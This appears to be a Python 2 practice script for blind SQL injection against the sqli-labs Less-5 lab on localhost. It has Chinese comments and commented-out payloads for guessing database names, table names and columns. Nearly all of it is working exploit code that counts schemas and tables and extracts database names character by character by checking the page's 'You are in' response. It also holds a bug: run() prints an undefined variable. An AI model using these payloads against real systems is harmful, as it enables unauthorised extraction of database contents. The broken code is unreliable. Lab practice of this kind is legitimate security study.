#! /usr/bin/env python
# encoding=utf-8
import requests
import string
from lxml import etree

#data = 'and substr(verison(),1,1)=5 --+'

"""
在这里我发现一个sqli-labs的一个bug，应该说是一个投机取巧的办法，就是我把version打错成verison，labs的平台会直接爆出库名
但是还是忽视这个，毕竟实战或者ctf的时候并不会有这种报错。
"""

#data2 = 'and length(database())=8 --+'
#data3 = 'and left(database(),1)>\'r\' --+'

"""
继续猜的话就是left(database(),2)>'xx'
"""
#猜表
#data1 = 'and ascii(substr((select table_name from information_schema.tables where table_schema=\'security\' limit 0,1),1,1)) > 100'

#data2 =  'and 1=(select 1 from information_schema.columns where table_name=\'users\' and column_name regexp \'^username\' limit 0,1) --+'

dataset = " abcdefghijklmnopqrstuvwxyz_"
querydata = "schema_name"
querydb = "INFORMATION_SCHEMA"
def sendPayload(payload):
	url = "http://127.0.0.1/Less-5/?id=1\' "+ payload
	content = requests.post(url).text
	return content
def findDatabaseNumber():
	count = 1
	while count:
		payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA)="
		payload = payload + str(count) + "--+"
		#print payload
		recv = sendPayload(payload)
		if "You are in" in recv:
			return count
		else:
			count += 1
def getDatabaseName(dbNum):
	for k in range(dbNum):
		i = 1
		result = ""
		while i :
			for j in dataset:
				querysql = "AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j
				recv = sendPayload(querysql)
				if "You are in" in recv:
					if j != ' ':
						result += j
						i += 1
					else:
						print result
						i = 0
  					break
def gettablenum():
    count = 1
    while count:
        payload = "and (select count(*) from information_schema.tables where table_schema=\'security\')="

        payload = payload + str(count) + '--+'
        print payload
        recv = sendPayload(payload)
        if "You are in" in recv:
            return count
        else:
            count += 1




def run():
    dbNum = findDatabaseNumber()
    tabnum = gettablenum()
    print "the number of tables is" + str(dbMum)
    """
    猜表名同理可得
    """
    print "the number of database is "+str(dbNum)
    getDatabaseName(dbNum)
run()